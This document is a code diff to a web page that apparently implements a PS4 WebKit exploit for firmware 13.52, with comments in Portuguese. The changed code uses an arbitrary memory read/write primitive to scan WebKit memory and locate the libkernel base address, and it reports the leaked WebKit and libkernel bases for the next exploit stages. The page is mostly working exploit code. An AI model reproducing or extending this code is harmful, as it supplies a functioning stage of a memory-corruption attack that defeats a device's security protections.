@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 - Safe Kernel Resolver)</title>
+<title>PS4 WebKit Exploit (13.52 - Direct Stub Resolver)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -74,7 +74,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 
 <!-- Constants output -->
 <div id="cbox">
-  <div class="ct">// ═══ ANÁLISE DE BASES (13.52) ═══</div>
+  <div class="ct">// ═══ RESOLUÇÃO DE STUBS (13.52) ═══</div>
   <div id="c-out"></div>
 </div>
 
@@ -108,31 +108,26 @@ function setCard(id, v) {
   el.textContent = v; el.classList.remove('na');
 }
 
-// Resolução segura de stubs sem varredura pesada
-async function resolveKernelSafe(p, webkitBase) {
-  logH('RESOLUÇÃO SEGURA DE KERNEL');
+// Varredura segura na região típica de stubs e imports do WebKit (faixa de 0x3000000 a 0x3800000)
+async function resolveKernelStubs(p, webkitBase) {
+  logH('VARREDURA DE STUBS DA LIBKERNEL');
   let libKernelBase = null;
 
   try {
-    // Procura por ponteiros de stubs conhecidos na faixa esperada da libkernel (0x80xxxxxxx)
-    // verificando as referências apontadas por áreas de vtable ou apontadores do DOM element.
-    let textArea = document.createElement("textarea");
-    let vtPtr = p.read8(p.leakval(textArea).add32(0x18));
-    let vtable = p.read8(vtPtr);
-
-    log('[+] Inspecionando vtable do elemento DOM para stubs...', 'i');
-    for (let i = 0; i < 30; i++) {
+    // Varre a região de stubs/imports mapeada no binário do WebKit
+    for (let off = 0x3000000; off < 0x3800000; off += 8) {
       try {
-        let entry = p.read8(vtable.add32(i * 8));
-        if (entry.hi === 0x80) {
-          libKernelBase = new int64(entry.low & ~0x3FFF, entry.hi);
-          log(`[+] libkernel Base encontrada via vtable: 0x${libKernelBase.toString()}`, 'ok');
+        let ptr = p.read8(webkitBase.add32(off));
+        // Se o ponteiro apontar para a faixa de memória da libkernel (0x80xxxxxxx)
+        if (ptr.hi === 0x80 && (ptr.low & 0x3FFF) === 0) {
+          libKernelBase = new int64(ptr.low, ptr.hi);
+          log(`[+] libkernel Base isolada no offset RVA 0x${off.toString(16)}: 0x${libKernelBase.toString()}`, 'ok');
           break;
         }
       } catch (e) {}
     }
   } catch (err) {
-    log('[-] Erro na resolução segura: ' + err.message, 'e');
+    log('[-] Erro na varredura de stubs: ' + err.message, 'e');
   }
 
   return libKernelBase;
@@ -182,7 +177,7 @@ async function main() {
   }
 
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Resolvendo bases do sistema...', 'r');
+  setStatus('Resolvendo bases e stubs...', 'r');
   logH('RESOLUÇÃO DE BASES (13.52)');
 
   const ctor = globalThis.__ps5NativeCtor;
@@ -206,21 +201,21 @@ async function main() {
     log('[+] WebKit Base calculada: 0x' + webkitBase.toString(), 'ok');
     setCard('c-wk', '0x' + webkitBase.toString());
 
-    // Aguarda estabilização e executa a resolução limpa da libkernel
+    // Dispara a busca direcionada na área de stubs após estabilização
     setTimeout(async () => {
-      const lkBase = await resolveKernelSafe(p, webkitBase);
+      const lkBase = await resolveKernelStubs(p, webkitBase);
       if (lkBase) setCard('c-lk', '0x' + lkBase.toString());
 
-      setStatus('Ambiente pronto!', 'ok');
-      log('✔ Processo concluído com estabilidade.', 'ok');
+      setStatus('Mapeamento concluído!', 'ok');
+      log('✔ Ambiente pronto para os próximos passos.', 'ok');
 
       const cbox = document.getElementById('cbox');
       cbox.style.display = 'block';
       document.getElementById('c-out').textContent =
         `__ps5NativeCtor = 0x${ctorInt64.toString()}\n` +
         `WebKit Base    = 0x${webkitBase.toString()}\n` +
-        `libkernel Base = ${lkBase ? '0x' + lkBase.toString() : 'Aguardando mapeamento'}`;
-    }, 800);
+        `libkernel Base = ${lkBase ? '0x' + lkBase.toString() : 'Não mapeado'}`;
+    }, 1000);
 
   } else {
     log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
